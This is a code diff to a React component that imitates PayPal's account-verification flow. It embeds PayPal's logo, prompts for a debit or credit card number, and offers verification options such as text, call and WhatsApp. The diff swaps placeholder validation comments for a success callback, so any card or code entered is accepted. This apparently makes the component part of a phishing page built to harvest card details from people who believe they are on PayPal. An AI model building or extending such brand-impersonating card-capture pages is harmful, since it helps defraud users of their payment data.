@@ -4,12 +4,13 @@ import { CreditCard, List, MessageSquare, Phone, Mail } from 'lucide-react';
 interface VerificationPageProps {
   email: string;
   onBack: () => void;
+  onVerificationSuccess: () => void;
 }
 
 type VerificationStep = 'choose' | 'confirm_card' | 'enter_code';
 type VerificationOption = 'confirm_card' | 'security_questions' | 'paypal_app' | 'get_text' | 'have_call' | 'get_email' | 'whatsapp';
 
-export function VerificationPage({ email, onBack }: VerificationPageProps) {
+export function VerificationPage({ email, onBack, onVerificationSuccess }: VerificationPageProps) {
   const [step, setStep] = useState<VerificationStep>('choose');
   const [loading, setLoading] = useState(false);
   const [selectedOption, setSelectedOption] = useState<VerificationOption>('confirm_card');
@@ -75,13 +76,12 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
 
   const handleConfirm = (e: React.FormEvent) => {
     e.preventDefault();
-    // In a real app, this would validate card details
-    // For now, we'll just go back to choose or stay
+    onVerificationSuccess();
   };
 
   const handleCodeSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    // In a real app, this would validate the code
+    onVerificationSuccess();
   };
 
   const renderTopBar = () => (
@@ -113,12 +113,14 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
         {renderTopBar()}
         <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
           <form onSubmit={handleConfirm} className="w-full flex flex-col items-center">
+            {/* PayPal Logo */}
             <div className="mb-8 self-start">
               <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
                 <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
                 <path d="M68.5,70.8l-8.8,55.6c-0.3,1.9,1.2,3.6,3.1,3.6h18.2c1.9,0,3.5-1.4,3.8-3.3l5.8-36.7l0.2-1.1 c0.3-1.9,1.9-3.3,3.8-3.3h16.5c12.2-1.9,21.4-11.6,23.4-24.1c0.8-5.1,0.2-9.8-1.7-13.7c-3.6-7.5-11.9-11.5-22.6-11.5H72.3 C70.4,39.3,68.8,40.7,68.5,42.6L68.5,70.8z" fill="#0079C1" />
               </svg>
             </div>
+            
             <h1 className="text-[32px] font-bold text-gray-900 leading-tight mb-8 self-start tracking-tight">
               Confirm Debit/Credit Card number
             </h1>
